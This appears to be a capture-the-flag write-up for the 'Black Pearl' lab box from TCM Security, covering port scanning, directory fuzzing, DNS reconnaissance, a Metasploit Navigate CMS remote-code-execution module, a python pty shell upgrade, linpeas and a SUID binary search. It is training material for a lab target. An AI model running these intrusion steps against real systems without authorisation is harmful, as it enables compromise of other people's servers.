---
title: "Black Pearl"
date: 2025-01-01
hideDate: true
draft: false
tags: ["others", "practice", "medium"]
categories: ["writeups"]
summary: "![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd7ByBhk6HGjLsOA-aL1WHZXODt12CBdIzUWZ2t33gwtveOkuDLUPULpG43YhLcAFYgetHOvM4DA7pKRmm1FYCBrziaqnFSevpKF4fEu2kY9Leuv9zwv79yGckv2Wjh9vtSAuV8vw?key=ce_5O9rNt0EGI5Qg1ml4xzgN)"
ShowToc: true
TocOpen: false
platformLabel: "TCM Security"
cover:
  image: "00-card.png"
  alt: "Black Pearl"
  relative: true
---

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd7ByBhk6HGjLsOA-aL1WHZXODt12CBdIzUWZ2t33gwtveOkuDLUPULpG43YhLcAFYgetHOvM4DA7pKRmm1FYCBrziaqnFSevpKF4fEu2kY9Leuv9zwv79yGckv2Wjh9vtSAuV8vw?key=ce_5O9rNt0EGI5Qg1ml4xzgN)

## Nmap:

I have runned same again nmaps scan

```bash
nmap -T4 -p- -A 192.168.100.131
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeONIHXfscoI0I3RZFZlVEnuREcWEY8fGtnzK5axoOQPfKtthcKUtnHy-rePN8aXjeiE9rOZ74WmkExto52D193foG_OD-oTWHhLg3NP2KwdWdboKUSbo26zcEjirY1qBy89HGTcg?key=ce_5O9rNt0EGI5Qg1ml4xzgN)

### Analyzing Scan Results:

- Port:
	- 22: SSH - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	- 80: HTTP - nginx 1.14.2

## Port 80

We got a default webpage.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcduzh1X-TTR7J0z8Mk7SGbQXBA8TdimzlStnowu-yAp3Tt39tUZ5Cq0QctU0iBaKvykNcxfl9CS_1KpUKI_ZmzukWz-YtD_K7DFYQtmd7lT6Xrx8g4_GGZhaeDk5XhoNAqp8kC?key=ce_5O9rNt0EGI5Qg1ml4xzgN)

I'm going to run FuFF and Gobuster to find extera directorys.

gobuster dir -u http://192.168.100.131:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdD6P04Yg_qoOtw8DkTo7hgrsc5TB8Kqr8DhsuKMoA3438mdlZdhwWNvnahSKYOZ7eSo3dtOezJdHkc-2X9pjGGw0cy2fpSxB0NUjkse-7eXU2Y_WSlGQVBMqLpVl-L81ETG0BB?key=ce_5O9rNt0EGI5Qg1ml4xzgN)

I have found a /secret directory.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeEZLIzbW9BKOlsSKHvNqCL4YOuDuzQa7EPs6WGQ7nIRJmd2kw3Yvp3XVpBbieda7XyMTLN6fIdmd1bpWTcdWPuJeHeyip2i7u9ZsojwgO9jrDXzCNXOpIDSNORB8Xi_Eb8UAM3?key=ce_5O9rNt0EGI5Qg1ml4xzgN)

In the page source i have found a e-mail adres.

alek@blackpearl.tcm

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf_MQ72F4YWxPHxSVROQ97Vvgi8A8yQXGkSWmTFZDQE_XpTsuH91YLZAjaO2fLGUkm3eoVLZ7ZBDm597JsKMaikpXRHi2rA0f3nROLaiAa8LKIoMgytyez4d2rtJV4VOj9rhO6ejg?key=ce_5O9rNt0EGI5Qg1ml4xzgN)

## Port 53

Here I'm gonna use a tool dnsrecon

```bash
dnsrecon -r 127.0.0.0/24 -n 192.168.100.128 -d blah
```

- dnsrecon
- -r this is for our range
- 127.0.0.0/24 we gonna scan our localhost machine
- -n ip adres of te box we are looking for
- -d is needed for our domain

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd-n7HE7puyIb7_0_TyplYg4oPFNzS4XKUIasCM1akhk9brf0BVzDWp_qkhl85qxB_AxOxCsn55362Yz5x5zwHOKcyONDg4rI4EXQ8y-7VDn2Ucd3ldwDEi1nLbaW0vxdI4nZqK?key=ce_5O9rNt0EGI5Qg1ml4xzgN)

We can see now under http://blackpearl.tcm/
![php website](php website.png)

Im gonna use Fuzz one more time to see if we can get more information
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
```
![navigate](navigate.png)

We can se a /navigate directory now. We get a login screen website.
![Login screen](Login screen.png)

### Metasploit

I'm going use this exploit from https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/

```bash
msf > use exploit/multi/http/navigate_cms_rce
```
![metasploit](metasploit.png)

We need to set RHOST and VHOST
```
set RHOSTS 192.168.100.131
set VHOST blackpearl.tcm
```
![rhost vhost](rhost vhost.png)

We can run this exploit
![run](run.png)

We need to get better shell on this machine.
We can do this with python script if python is on the machine
With command:
```bash
which python
```

We can see python on the machine
![python](python.png)

We can paste now this script:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
![python script](python script.png)

### Privilage Escalation

We need now to get root on this machine So, I decided to get linpeas to do it for me

I have started http server on my attack machine to send linpeas


![python3 server](python3 server.png)
![linPeas wget](linPeas wget.png)

Now to be able to run linpeas, input the command:

![linpeas](linpeas.png)

When looking through linpeas, we majorly focus on anything with the colour red or yellow.
![premissions](premissions.png)
For this particular box, we are majorly focusing on the **s** we can see highlighted in the image above.  
Now if you are familiar with permissions, you'd know we are supposed to have just r-w-x which stands for read, write and execute respectively.

But in the space permission for root we are seeing **S** which means we can run the binary as root and abuse the feature.

Input the command below to see all the permissions we can run as root and abuse in a much cleaner setting:
```bash
find / -type f -perm -4000 2>/dev/null
```
